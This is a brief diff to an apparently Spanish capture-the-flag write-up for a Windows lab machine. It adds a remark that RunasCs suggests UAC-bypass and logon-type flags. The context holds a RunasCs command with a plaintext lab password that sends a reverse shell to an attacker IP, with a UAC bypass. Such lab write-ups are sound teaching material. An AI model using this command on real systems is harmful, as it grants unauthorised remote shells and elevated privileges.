@@ -778,6 +778,7 @@ napper\backup
 ```
 
 Ahora nos podemos mandar una revshell como este usuario.
+**El propio `RunasCs.exe` nos está avisando de que usemos la flag --bypass-uac y --logon-type 8 para conseguir un token mas priviliago para el proceso**
 
 ```console
 C:\ProgramData>.\RunasCs.exe backup qGTwMxgZpboSlSJiYGqfSdBXmgtaVRAGWIsPdfVb cmd.exe -r 10.10.14.125:443 --bypass-uac --logon-type 8
